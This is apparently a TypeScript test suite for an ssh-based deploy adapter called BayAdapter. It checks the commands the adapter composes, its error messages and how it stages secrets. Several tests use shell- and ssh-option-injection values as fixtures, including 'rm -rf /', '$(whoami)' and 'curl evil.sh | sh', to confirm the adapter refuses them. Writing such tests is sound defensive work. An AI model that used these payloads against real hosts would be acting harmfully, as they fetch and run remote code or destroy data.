import { readFile } from "node:fs/promises";
import { Alepha, AlephaError } from "alepha";
import { type BuildTarget, buildOptions } from "alepha/cli";
import type { RunnerMethod } from "alepha/command";
import {
  FileSystemProvider,
  MemoryFileSystemProvider,
  MemoryShellProvider,
  ShellProvider,
} from "alepha/system";
import { describe, expect, it } from "vitest";
import { BayAdapter } from "../adapters/BayAdapter.ts";
import type { PlatformContext } from "../adapters/PlatformAdapter.ts";

/**
 * Runs a task's handler straight through.
 *
 * What these tests are about is the command the adapter composes, not how the
 * step is reported.
 */
const run: RunnerMethod = (async (task: { handler: () => Promise<unknown> }) =>
  await task.handler()) as unknown as RunnerMethod;

const context = (overrides: Partial<PlatformContext> = {}): PlatformContext =>
  ({
    project: "demo",
    env: "production",
    root: "/project",
    envConfig: { adapter: "bay", host: "deploy@bay.example.com" },
    ...overrides,
  }) as unknown as PlatformContext;

const setup = async () => {
  const alepha = Alepha.create()
    .with({ provide: FileSystemProvider, use: MemoryFileSystemProvider })
    .with({ provide: ShellProvider, use: MemoryShellProvider });
  const fs = alepha.inject(MemoryFileSystemProvider);
  await fs.writeFile("/project/yarn.lock", "");
  // `alepha pack` is a recorded no-op under MemoryShellProvider, so the
  // artifact it "produced" has to exist for the deploy step to find it.
  await fs.writeFile("/project/demo-latest.tar.gz", "TARBALL");
  return {
    alepha,
    adapter: alepha.inject(BayAdapter),
    shell: alepha.inject(MemoryShellProvider),
    fs,
  };
};

/**
 * Exposes the protected `quote` method for a direct test.
 *
 * Every real caller pre-validates its arguments via `assertSafe` before they
 * ever reach `quote`, so its own escaping is unreachable from any behavioral
 * test in this file — this is the one test that would actually go red if the
 * escaping itself broke.
 */
class QuotingBayAdapter extends BayAdapter {
  public testQuote(value: string): string {
    return this.quote(value);
  }
}

describe("BayAdapter — the host it deploys to", () => {
  it("refuses to guess when no host is configured", async () => {
    const { adapter } = await setup();

    await expect(
      adapter.authenticate(context({ envConfig: { adapter: "bay" } }), run),
    ).rejects.toThrowError(/No Bay host for environment "production"/);
  });

  it("names both fixes, so neither has to be guessed", async () => {
    const { adapter } = await setup();

    await expect(
      adapter.authenticate(context({ envConfig: { adapter: "bay" } }), run),
    ).rejects.toThrowError(/alepha\.config\.ts[\s\S]*BAY_HOST/);
  });

  it("takes $BAY_HOST over the config, so CI needs no edit", async () => {
    const { adapter, shell } = await setup();
    process.env.BAY_HOST = "ci@other.example.com";
    try {
      await adapter.authenticate(context(), run);
    } finally {
      delete process.env.BAY_HOST;
    }

    expect(
      shell.wasCalled("ssh -o BatchMode=yes ci@other.example.com bay list"),
    ).toBe(true);
  });

  it("probes with `bay list`, which reaches the control socket — `bay version` does not", async () => {
    // On the Go side, "version" is `fmt.Println(version)`: a local constant,
    // printed without ever dialing the control socket. Probing with it would
    // prove only that ssh works and `bay` is on PATH — every wrong `socket`
    // path, missing group membership, or `bay serve` being down would all
    // survive it and only surface after a full build and pack.
    const { adapter, shell } = await setup();

    await adapter.authenticate(context(), run);

    expect(
      shell.wasCalled("ssh -o BatchMode=yes deploy@bay.example.com bay list"),
    ).toBe(true);
  });
});

describe("BayAdapter — what it refuses to put on a command line", () => {
  /*
    `ssh` joins its command arguments into ONE string and hands it to the
    remote login shell, so the local argv-array form protects nothing on the
    far side. A domain of "a.com; rm -rf /" would run as two commands.

    Every case below asserts `shell.calls` is EMPTY rather than just that a
    throw happened — a future refactor that validates after composing would
    still pass a throw-only assertion while having already built the string.
  */
  it("refuses an app name carrying a shell metacharacter", async () => {
    const { adapter, shell } = await setup();

    await expect(
      adapter.teardown(context({ project: "demo; rm -rf /" }), run),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses an environment carrying a shell metacharacter", async () => {
    const { adapter, shell } = await setup();

    await expect(
      adapter.teardown(context({ env: "prod$(whoami)" }), run),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses a domain carrying a shell metacharacter", async () => {
    const { adapter, shell } = await setup();

    await expect(
      adapter.deploy(
        context({
          envConfig: {
            adapter: "bay",
            host: "deploy@bay.example.com",
            domain: "app.com; curl evil.sh | sh",
          },
        }),
        run,
      ),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses a host that would be read as an ssh option", async () => {
    // Argument injection, not shell injection: a "host" of
    // -oProxyCommand=... is consumed by ssh itself, before any remote shell
    // exists. OpenSSH has no reliable `--`, so the pattern is the defence.
    const { adapter, shell } = await setup();

    await expect(
      adapter.authenticate(
        context({
          envConfig: {
            adapter: "bay",
            host: "-oProxyCommand=curl evil.sh|sh",
          },
        }),
        run,
      ),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses a wildcard domain rather than shipping one Bay cannot serve", async () => {
    // Bay answers ACME over HTTP-01 / TLS-ALPN, neither of which can prove a
    // wildcard. Passing it through would fail on the host with a certificate
    // error naming nothing about this config.
    const { adapter, shell } = await setup();

    await expect(
      adapter.deploy(
        context({
          envConfig: {
            adapter: "bay",
            host: "deploy@bay.example.com",
            domain: "*.demo.example.com",
          },
        }),
        run,
      ),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("refuses a control socket path carrying a shell metacharacter", async () => {
    const { adapter, shell } = await setup();

    await expect(
      adapter.deploy(
        context({
          envConfig: {
            adapter: "bay",
            host: "deploy@bay.example.com",
            socket: "/var/lib/bay/control.sock; rm -rf /",
          },
        }),
        run,
      ),
    ).rejects.toThrowError(AlephaError);
    expect(shell.calls).toHaveLength(0);
  });

  it("names the value and the rule, not just 'invalid'", async () => {
    const { adapter } = await setup();

    await expect(
      adapter.teardown(context({ project: "demo; rm -rf /" }), run),
    ).rejects.toThrowError(/demo; rm -rf \//);
  });
});

describe("BayAdapter — the deploy it composes", () => {
  it("pipes the packed artifact into `bay deploy -`", async () => {
    const { adapter, shell } = await setup();

    await adapter.deploy(context(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          "bay deploy - --name demo --env production",
      ),
    ).toBe(true);
  });

  it("sends the artifact bytes on stdin, not a path", async () => {
    const { adapter, shell } = await setup();

    await adapter.deploy(context(), run);

    const [call] = shell.getCallsMatching(/bay deploy -/);
    const sent = call.options.stdin as Uint8Array;
    expect(new TextDecoder().decode(sent)).toBe("TARBALL");
  });

  it("packs before it deploys, and refuses if nothing was produced", async () => {
    const { adapter, fs } = await setup();
    await fs.rm("/project/demo-latest.tar.gz");

    await expect(adapter.deploy(context(), run)).rejects.toThrowError(
      /alepha pack. produced no/,
    );
  });

  it("passes a configured domain", async () => {
    const { adapter, shell } = await setup();

    await adapter.deploy(
      context({
        envConfig: {
          adapter: "bay",
          host: "deploy@bay.example.com",
          domain: "app.example.com",
        },
      }),
      run,
    );

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          "bay deploy - --name demo --env production --domain app.example.com",
      ),
    ).toBe(true);
  });

  it("repeats --domain for a comma-separated list", async () => {
    // An apex and its www are one site, and a value pasted out of a config
    // file arrives comma-separated. Bay accepts both shapes; sending one flag
    // per host is the one that cannot be misparsed.
    const { adapter, shell } = await setup();

    await adapter.deploy(
      context({
        envConfig: {
          adapter: "bay",
          host: "deploy@bay.example.com",
          domain: "example.com, www.example.com",
        },
      }),
      run,
    );

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          "bay deploy - --name demo --env production " +
          "--domain example.com --domain www.example.com",
      ),
    ).toBe(true);
  });

  it("returns the URL Bay reported", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        [[
          "ssh",
          "-o",
          "BatchMode=yes",
          "deploy@bay.example.com",
          "bay deploy - --name demo --env production",
        ].join(" ")]: JSON.stringify({ url: "https://demo.bay.example.com/" }),
      },
    });

    expect(await adapter.deploy(context(), run)).toBe(
      "https://demo.bay.example.com/",
    );
  });

  it("reports no URL rather than a link built from a non-JSON answer", async () => {
    // Anything but JSON means something other than `bay deploy` answered.
    // Turning that into a link is how `up` finishes green pointing at nothing.
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        [[
          "ssh",
          "-o",
          "BatchMode=yes",
          "deploy@bay.example.com",
          "bay deploy - --name demo --env production",
        ].join(" ")]: "-bash: bay: command not found",
      },
    });

    expect(await adapter.deploy(context(), run)).toBeUndefined();
  });
});

describe("BayAdapter — the control socket it can be told about", () => {
  /*
    Bay's default root is the RELATIVE path `./bay-data`, and an ssh command
    runs non-interactively with cwd = $HOME, so on any host whose root is not
    `$HOME/bay-data` — every `--root /var/lib/bay` install included — Bay's
    own guess at the socket misses. `$BAY_SOCKET` on the remote host is Bay's
    escape hatch, but a non-interactive ssh command reads neither
    `~/.profile` nor, on Debian/Ubuntu's default, `~/.bashrc`, so there is
    nowhere reliable to export it from. `--control-socket` on every `bay`
    invocation sidesteps needing a remote shell profile at all.
  */
  const socketContext = () =>
    context({
      envConfig: {
        adapter: "bay",
        host: "deploy@bay.example.com",
        socket: "/var/lib/bay/control.sock",
      },
    });

  it("appends --control-socket to the deploy command when one is configured", async () => {
    const { adapter, shell } = await setup();

    await adapter.deploy(socketContext(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          "bay deploy - --name demo --env production " +
          "--control-socket /var/lib/bay/control.sock",
      ),
    ).toBe(true);
  });

  it("appends --control-socket to `bay list` and `bay remove` too", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list --control-socket /var/lib/bay/control.sock":
          "[]",
      },
    });

    await adapter.inspect(socketContext(), run);
    await adapter.teardown(socketContext(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com bay list --control-socket /var/lib/bay/control.sock",
      ),
    ).toBe(true);
    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com bay remove demo/production --control-socket /var/lib/bay/control.sock",
      ),
    ).toBe(true);
  });

  it("never puts --control-socket on `id -nG`, which is not a bay command", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG":
          "deploy docker bay-control",
        "ssh -o BatchMode=yes deploy@bay.example.com bay list --control-socket /var/lib/bay/control.sock":
          "[]",
      },
    });

    await expect(adapter.login(socketContext(), run)).resolves.toBeUndefined();

    // The bare form, with no flag at all — not merely "some call happened".
    expect(
      shell.wasCalled("ssh -o BatchMode=yes deploy@bay.example.com id -nG"),
    ).toBe(true);
  });
});

describe("BayAdapter — what it says when ssh fails", () => {
  const failWith = async (message: string) => {
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list": message,
      },
    });
    return adapter.authenticate(context(), run);
  };

  it("names the key when the host refused it", async () => {
    await expect(
      failWith("Permission denied (publickey)."),
    ).rejects.toThrowError(/authorized_keys/);
  });

  it("says to set `socket`, not to fix group membership, when Bay never found any socket at all", async () => {
    // "no control socket found" means Bay never even tried to dial anything —
    // nothing was passed via --control-socket and its own relative-path guess
    // found no file. That is a config problem, not a group problem: the
    // genuine group failure looks completely different (below) and gets its
    // own, different advice.
    await expect(
      failWith("no control socket found — these commands run on the Bay host"),
    ).rejects.toThrowError(/never found its own control socket/);
  });

  it("names the PATH when bay is not installed for that user", async () => {
    await expect(failWith("bash: bay: command not found")).rejects.toThrowError(
      /PATH/,
    );
  });

  it("also recognizes dash's 'not found' phrasing for a missing PATH entry", async () => {
    // dash's login shell says "bay: not found", never "command not found".
    await expect(failWith("bay: not found")).rejects.toThrowError(/PATH/);
  });

  it("names the control group when the socket denies that specific user", async () => {
    // The failure that wastes an afternoon: the key works, the shell opens,
    // and Bay found the socket file (its directory is world-readable) but
    // refused to dial it for this user specifically. This wording is
    // identical to an SSH key refusal, so this fixture carries BOTH patterns
    // and would go red if the branches were checked in the other order (the
    // permission/publickey branch would win instead and report the wrong fix).
    await expect(
      failWith(
        "control api unreachable (is `bay serve` running?): " +
          "dial unix /var/lib/bay/control.sock: connect: permission denied",
      ),
    ).rejects.toThrowError(/usermod -aG bay-control/);
  });

  it("names an old bay's stdin limitation, not a PATH problem", async () => {
    // `open -: no such file or directory` is what a `bay` from before "-"
    // meant stdin produces: `os.Open("-")` fails just like any other missing
    // file. It contains "no such file or directory", so this fails if the
    // upgrade-bay branch were checked after the generic PATH one.
    await expect(
      failWith("error: open -: no such file or directory"),
    ).rejects.toThrowError(/too old to read the deploy artifact from stdin/);
  });

  it("names a bad `socket` value, not a PATH problem", async () => {
    // A `socket` pointing at nothing produces this exact wording, which also
    // contains "no such file or directory" — so this fails if the
    // socket-config branch were checked after the generic PATH one.
    await expect(
      failWith(
        "control api unreachable (is `bay serve` running?): " +
          "dial unix /var/lib/bay/wrong.sock: connect: no such file or directory",
      ),
    ).rejects.toThrowError(
      /nothing is listening at the configured control socket path/,
    );
  });
});

describe("BayAdapter — inspect", () => {
  const listing = (body: string) => async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list": body,
      },
    });
    return adapter.inspect(context(), run);
  };

  it("reads the canonical host out of `domains`, not the legacy `domain`", async () => {
    /*
      `state.App.Domains` is the live field — a list, canonical first, because
      an apex and its www are one site. `domain` is `LegacyDomain`, folded into
      `Domains` and cleared on load, so it is absent from anything a current
      Bay writes. Reading it reported `undefined` for every app.
    */
    const state = await listing(
      JSON.stringify([
        {
          name: "demo",
          env: "production",
          domains: ["demo.example.com", "www.demo.example.com"],
          release: "r-42",
        },
      ]),
    )();

    expect(state.workers).toEqual([
      {
        name: "demo/production",
        exists: true,
        detail: "demo.example.com",
        version: "r-42",
      },
    ]);
  });

  it("still reads a legacy `domain` from a host that has not been upgraded", async () => {
    const state = await listing(
      JSON.stringify([
        {
          name: "demo",
          env: "production",
          domain: "old.example.com",
          release: "r-1",
        },
      ]),
    )();

    expect(state.workers[0].detail).toBe("old.example.com");
  });

  it("reports only this project and this environment", async () => {
    const state = await listing(
      JSON.stringify([
        {
          name: "demo",
          env: "staging",
          domains: ["s.example.com"],
          release: "r-1",
        },
        {
          name: "other",
          env: "production",
          domains: ["o.example.com"],
          release: "r-2",
        },
        {
          name: "demo",
          env: "production",
          domains: ["d.example.com"],
          release: "r-3",
        },
      ]),
    )();

    expect(state.workers).toHaveLength(1);
    expect(state.workers[0].version).toBe("r-3");
  });

  it("survives a Bay with nothing deployed", async () => {
    // `bay list` marshals a nil slice as `null`, not `[]`. Calling .filter on
    // that throws, and the message names neither Bay nor the empty host.
    const state = await listing("null")();

    expect(state.workers).toEqual([]);
  });

  it("reports empty resource lists rather than inventing them", async () => {
    // Bay provisions from the manifest and exposes no inventory. Synthesising
    // entries from the manifest would report intent as fact.
    const state = await listing("[]")();

    expect(state.databases).toEqual([]);
    expect(state.buckets).toEqual([]);
    expect(state.secrets).toEqual([]);
  });

  it("names the fix rather than printing a raw shell error when ssh itself fails", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list":
          "Permission denied (publickey).",
      },
    });

    await expect(adapter.inspect(context(), run)).rejects.toThrowError(
      /authorized_keys/,
    );
  });

  it("names the host rather than dying on a non-JSON answer", async () => {
    // A non-JSON answer means something other than `bay list` responded — a
    // login banner, a stray shell error. The same reasoning `deployedUrl`
    // already applies to `bay deploy`.
    await expect(
      listing("-bash: bay: command not found")(),
    ).rejects.toThrowError(/bay list.*something other than JSON/);
  });
});

describe("BayAdapter — teardown", () => {
  it("removes the app and says the data stayed behind", async () => {
    const { adapter, shell } = await setup();

    await adapter.teardown(context(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com bay remove demo/production",
      ),
    ).toBe(true);
  });

  it("treats an app that was never deployed as done, not as a failure", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay remove demo/production":
          "404 Not Found: unknown app demo/production",
      },
    });

    await expect(adapter.teardown(context(), run)).resolves.toBeUndefined();
  });

  it("treats a genuine failure as a failure even when the app name contains '404'", async () => {
    // Bay echoes the app name back in its errors. A project legitimately
    // named "app404" must not have an unrelated removal failure misread as
    // "already removed" merely because its own name contains those digits.
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay remove app404/production":
          "failed to remove app404/production: internal server error",
      },
    });

    await expect(
      adapter.teardown(context({ project: "app404" }), run),
    ).rejects.toThrowError(/ssh to deploy@bay\.example\.com failed/);
  });
});

describe("BayAdapter — login and logout", () => {
  it("confirms the group membership deploys actually depend on", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG":
          "deploy docker bay-control",
        "ssh -o BatchMode=yes deploy@bay.example.com bay list": "[]",
      },
    });

    await expect(adapter.login(context(), run)).resolves.toBeUndefined();
  });

  it("earns its 'deploys will be accepted' claim with a real socket round trip", async () => {
    // `id -nG` alone cannot prove the socket is reachable — only a genuine
    // `bay list` call can. If `login` stopped calling it, this is the test
    // that would notice.
    const { adapter, shell } = await setup();
    shell.configure({
      errors: {
        "ssh -o BatchMode=yes deploy@bay.example.com bay list":
          "control api unreachable (is `bay serve` running?): " +
          "dial unix /var/lib/bay/control.sock: connect: permission denied",
      },
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG":
          "deploy docker bay-control",
      },
    });

    await expect(adapter.login(context(), run)).rejects.toThrowError(
      /usermod -aG bay-control/,
    );
    expect(
      shell.wasCalled("ssh -o BatchMode=yes deploy@bay.example.com bay list"),
    ).toBe(true);
  });

  it("says what to run when the key works but the group does not", async () => {
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG": "deploy docker",
      },
    });

    await expect(adapter.login(context(), run)).rejects.toThrowError(
      /usermod -aG bay-control/,
    );
  });

  it("checks the group before asking bay anything", async () => {
    // Ordering is the point: checking membership directly with `id -nG` is
    // faster and more portable than a round trip to the control socket that
    // would only fail predictably, so it runs first.
    const { adapter, shell } = await setup();
    shell.configure({
      outputs: {
        "ssh -o BatchMode=yes deploy@bay.example.com id -nG": "deploy docker",
      },
    });

    await adapter.login(context(), run).catch(() => {});

    expect(shell.calls).toHaveLength(1);
    expect(shell.calls[0].command).toContain("id -nG");
  });

  it("refuses to logout, and names where the key actually lives", async () => {
    const { adapter } = await setup();

    await expect(adapter.logout(context(), run)).rejects.toThrowError(
      /authorized_keys/,
    );
  });
});

describe("BayAdapter — the target it builds for", () => {
  /*
    `build` hardcoded `--target=bare`.

    The hardcode is load-bearing: a workerd bundle is resolved against
    Cloudflare's export conditions and has no runnable entry point, so letting
    one reach Bay produces an app that deploys, never boots, and says only
    "never became ready". But an explicit flag OVERRIDES the workspace's own
    `alepha.config.ts`, so a site declaring `target: "static"` was silently
    built as a server and shipped a bundle Bay would try to spawn.
  */
  const buildWith = async (target?: BuildTarget) => {
    // Its own container, and the store is mutated BEFORE the adapter is
    // injected — the order the previous version of this suite used, because
    // `$store` is resolved at injection.
    const alepha = Alepha.create()
      .with({ provide: FileSystemProvider, use: MemoryFileSystemProvider })
      .with({ provide: ShellProvider, use: MemoryShellProvider });
    const fs = alepha.inject(MemoryFileSystemProvider);
    await fs.writeFile("/project/yarn.lock", "");
    if (target) {
      alepha.store.mut(buildOptions, (current) => ({ ...current, target }));
    }
    const adapter = alepha.inject(BayAdapter);
    await adapter.build(context(), run);
    return alepha.inject(MemoryShellProvider);
  };

  it("should build a declared static site for the static target", async () => {
    const shell = await buildWith("static");

    expect(shell.wasCalled("yarn alepha build --target=static")).toBe(true);
  });

  it("should still force bare when nothing is declared", async () => {
    const shell = await buildWith();

    expect(shell.wasCalled("yarn alepha build --target=bare")).toBe(true);
  });

  it("should refuse to inherit a cloudflare target", async () => {
    const shell = await buildWith("cloudflare");

    expect(shell.wasCalled("yarn alepha build --target=bare")).toBe(true);
  });
});

describe("BayAdapter — the package manager it shells out to", () => {
  /*
    `yarn` was hardcoded in `build` and `pack`.

    Deploying an npm workspace therefore failed at the build step with yarn's
    own error — for lindocara, a complaint about a missing lockfile entry,
    because the project has a `package-lock.json` and no `yarn.lock`. Nothing
    in the message mentioned Bay, the adapter, or that yarn was an assumption.
  */
  const withLockfile = async (lockfile: string) => {
    const alepha = Alepha.create()
      .with({ provide: FileSystemProvider, use: MemoryFileSystemProvider })
      .with({ provide: ShellProvider, use: MemoryShellProvider });
    const fs = alepha.inject(MemoryFileSystemProvider);
    await fs.writeFile(`/project/${lockfile}`, "");
    const adapter = alepha.inject(BayAdapter);
    await adapter.build(context(), run);
    return alepha.inject(MemoryShellProvider);
  };

  it("should use yarn for a yarn workspace", async () => {
    const shell = await withLockfile("yarn.lock");

    expect(shell.wasCalled("yarn alepha build --target=bare")).toBe(true);
  });

  it("should run the binary, not a script, for an npm workspace", async () => {
    // Two ways to get this wrong, and the first fix hit the second: `npm
    // alepha …` is not a command, and `npm run alepha` looks for a
    // package.json SCRIPT by that name, which an app has no reason to declare.
    const shell = await withLockfile("package-lock.json");

    expect(shell.wasCalled("npx alepha build --target=bare")).toBe(true);
  });

  it("should use pnpm exec for a pnpm workspace", async () => {
    const shell = await withLockfile("pnpm-lock.yaml");

    expect(shell.wasCalled("pnpm exec alepha build --target=bare")).toBe(true);
  });

  it("should use bunx for a bun workspace", async () => {
    const shell = await withLockfile("bun.lock");

    expect(shell.wasCalled("bunx alepha build --target=bare")).toBe(true);
  });
});

describe("BayAdapter — quoting", () => {
  it("round-trips a value containing a single quote", async () => {
    const alepha = Alepha.create()
      .with({ provide: FileSystemProvider, use: MemoryFileSystemProvider })
      .with({ provide: ShellProvider, use: MemoryShellProvider });
    const adapter = alepha.inject(QuotingBayAdapter);

    // `'\''` closes the quote, escapes a literal `'` outside it, and reopens
    // it — the only way to put a single quote inside single-quoted shell
    // text. Every real caller pre-validates before reaching this, so nothing
    // else in this file exercises the escaping itself.
    expect(adapter.testQuote("it's a test; rm -rf /")).toBe(
      "'it'\\''s a test; rm -rf /'",
    );
  });
});

describe("BayAdapter — the secrets that ride the deploy", () => {
  /**
   * A workspace whose `.env.production` holds what the author wrote in it.
   */
  const withEnvFile = async (body: string) => {
    const it = await setup();
    await it.fs.writeFile("/project/.env.production", body);
    return it;
  };

  /**
   * A built workspace whose `dist/manifest.json` declares these `$env` keys.
   *
   * This is what a CI runner has and a laptop usually does not: the artifact,
   * no `.env` file, and the secrets in the job environment.
   */
  const withManifest = async (envKeys: string[], file?: string) => {
    const it = await setup();
    await it.fs.writeFile(
      "/project/dist/manifest.json",
      JSON.stringify({ project: "demo", env: envKeys }),
    );
    if (file !== undefined) {
      await it.fs.writeFile("/project/.env.production", file);
    }
    return it;
  };

  const sentPayload = (shell: MemoryShellProvider): string => {
    const [call] = shell.getCallsMatching(/cat >/);
    if (!call) {
      // Said explicitly, because "nothing was pushed" is the failure these
      // tests exist to catch and a bare `undefined.options` names nothing.
      throw new Error("nothing was staged — no secrets file was written");
    }
    return new TextDecoder().decode(call.options.stdin as Uint8Array);
  };

  /**
   * Runs `body` with these variables in `process.env`, and removes them again
   * whatever happens — a leaked one would silently change a later test.
   */
  const withProcessEnv = async (
    vars: Record<string, string>,
    body: () => Promise<unknown>,
  ) => {
    const previous = new Map(
      Object.keys(vars).map((key) => [key, process.env[key]]),
    );
    Object.assign(process.env, vars);
    try {
      await body();
    } finally {
      for (const [key, value] of previous) {
        if (value === undefined) {
          delete process.env[key];
        } else {
          process.env[key] = value;
        }
      }
    }
  };

  /**
   * The path `--secrets-file` was given, pulled back out of the deploy command.
   */
  const stagedPath = (shell: MemoryShellProvider): string => {
    const [call] = shell.getCallsMatching(/--secrets-file/);
    if (!call) {
      throw new Error("the deploy carried no --secrets-file");
    }
    const path = /--secrets-file (\S+)/.exec(call.command)?.[1];
    if (!path) {
      throw new Error(`no path after --secrets-file in: ${call.command}`);
    }
    return path;
  };

  /**
   * A workspace whose `bay deploy` fails with this message, whatever random
   * secrets path it happens to carry.
   *
   * `MemoryShellProvider` keys its errors on the exact command string, and the
   * staged path is 16 random bytes — so the failure has to be installed by
   * pattern rather than by key. The call is still recorded before it throws,
   * so `stagedPath` can find it afterwards.
   */
  const failingDeploy = async (message: string) => {
    const it = await withEnvFile("STRIPE_KEY=sk_live_1\n");
    const inner = it.shell.run.bind(it.shell);
    it.shell.run = (async (
      command: string | string[],
      options: Record<string, unknown> = {},
    ) => {
      const recorded = await inner(command, options);
      const key = Array.isArray(command) ? command.join(" ") : command;
      if (/bay deploy -/.test(key)) {
        throw new AlephaError(message);
      }
      return recorded;
    }) as typeof it.shell.run;
    return it;
  };

  it("stages the assignments on the host and hands the deploy their path", async () => {
    const { adapter, shell } = await withEnvFile("STRIPE_KEY=sk_live_1\n");

    await adapter.deploy(context(), run);

    expect(sentPayload(shell)).toBe("STRIPE_KEY=sk_live_1\n");
    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com bay deploy - " +
          `--name demo --env production --secrets-file ${stagedPath(shell)}`,
      ),
    ).toBe(true);
  });

  it("stages the file before the deploy that consumes it", async () => {
    /*
      The ordering IS the fix. Bay merges the file during provision — before
      the release is swapped in and before the process starts — so the app
      boots with its secrets and there is no window where it runs without
      them. A staging call that landed after the deploy would be the old
      after-the-fact push wearing a new name.
    */
    const { adapter, shell } = await withEnvFile("STRIPE_KEY=sk_live_1\n");

    await adapter.deploy(context(), run);

    const staged = shell.calls.findIndex((c) => /cat >/.test(c.command));
    const deployed = shell.calls.findIndex((c) =>
      /bay deploy -/.test(c.command),
    );
    expect(staged).toBeGreaterThanOrEqual(0);
    expect(deployed).toBeGreaterThan(staged);
  });

  it("writes the staged file 0600 by setting the umask, never by chmod after", async () => {
    /*
      `scp` would reproduce the LOCAL file's mode, so a developer with a lax
      umask ships a world-readable secrets file — and a chmod afterwards
      leaves a window in which it is readable. `umask 077` before the redirect
      means the file is 0600 from the instant it exists.
    */
    const { adapter, shell } = await withEnvFile("STRIPE_KEY=sk_live_1\n");

    await adapter.deploy(context(), run);

    expect(
      shell.wasCalled(
        "ssh -o BatchMode=yes deploy@bay.example.com " +
          `umask 077; cat > ${stagedPath(shell)}`,
      ),
    ).toBe(true);
    expect(shell.wasCalledMatching(/scp/)).toBe(false);
    expect(shell.wasCalledMatching(/chmod/)).toBe(false);
  });

  it("uses an unpredictable path, so nobody can pre-create it", async () => {
    /*
      The other half of the symlink defence. A predictable path under /tmp on a
      shared box can be planted as a link by another user before the deploy
      runs, and `cat >` would write the secrets straight through it. Bay
      refuses a symlink too (O_NOFOLLOW), so both ends have to fail.
    */
    const { adapter, shell } = await withEnvFile("STRIPE_KEY=sk_live_1\n");
    const { adapter: other, shell: otherShell } = await withEnvFile(
      "STRIPE_KEY=sk_live_1\n",
    );

    await adapter.deploy(context(), run);
    await other.deploy(context(), run);

    expect(stagedPath(shell)).toMatch(/^\/tmp\/\.bay-secrets-[0-9a-f]{32}$/);
    expect(stagedPath(shell)).not.toBe(stagedPath(otherShell));
  });

  it("sweeps the staged file when the deploy never reached Bay", async () => {
    /*
      Bay consumes the file itself, on success and on every refusal, so the
      only way one survives is a deploy that never got there — ssh refused,
      `bay` missing, the socket down. That file is plaintext credentials, and
      the host is about to be logged into by somebody debugging.
    */
    const { adapter, shell } = await failingDeploy("boom");

    await expect(adapter.deploy(context(), run)).rejects.toThrowError();

    expect(
      shell.wasCalled(
        `ssh -o BatchMode=yes deploy@bay.example.com rm -f ${stagedPath(shell)}`,
      ),
    ).toBe(true);
  });

  it("keeps the deploy's own error when the sweep also fails", async () => {
    // The sweep runs on a path where something has already gone wrong. An
    // `rm` failure replacing that error would bury the only message that
    // explains the deploy.
    const { adapter, shell } = await failingDeploy("the real failure");
    const inner = shell.run.bind(shell);
    shell.run = (async (
      command: string | string[],
      options: Record<string, unknown> = {},
    ) => {
      const key = Array.isArray(command) ? command.join(" ") : command;
      if (/rm -f/.test(key)) {
        throw new AlephaError("the sweep failed too");
      }
      return await inner(command, options);
    }) as typeof shell.run;

    await expect(adapter.deploy(context(), run)).rejects.toThrowError(
      /the real failure/,
    );
  });

  it("never puts a secret in argv", async () => {
    /*
      The reason stdin was chosen. An argument is in the host's process table
      for every user running `ps`, and in the caller's shell history. Asserting
      on the composed command string rather than on the argv array, because
      `ssh` joins them anyway — the string is what actually reaches the host.
    */
    const { adapter, shell } = await withEnvFile("STRIPE_KEY=sk_live_secret\n");

    await adapter.deploy(context(), run);

    for (const call of shell.calls) {
      expect(call.command).not.toContain("sk_live_secret");
    }
  });

  it("takes the file's value over this shell's", async () => {
    /*
      `process.env` is the FALLBACK, not the source. A developer whose shell
      happens to export a stale STRIPE_KEY must still deploy what their
      `.env.production` says — otherwise the file everyone reads to know what
      is deployed is not what is deployed.
    */
    const { adapter, shell } = await withEnvFile("STRIPE_KEY=from_the_file\n");

    await withProcessEnv(
      { STRIPE_KEY: "from_the_shell", AMBIENT_ONLY: "from_the_shell" },
      () => adapter.deploy(context(), run),
    );

    const payload = sentPayload(shell);
    expect(payload).toContain("STRIPE_KEY=from_the_file");
    expect(payload).not.toContain("from_the_shell");
    expect(payload).not.toContain("AMBIENT_ONLY");
  });

  it("does not push a key Bay writes itself", async () => {
    // Bay REFUSES these, naming them. Filtering here is what keeps a
    // `.env.production` that legitimately carries APP_SECRET for another
    // platform from failing every Bay deploy.
    const { adapter, shell } = await withEnvFile(
      [
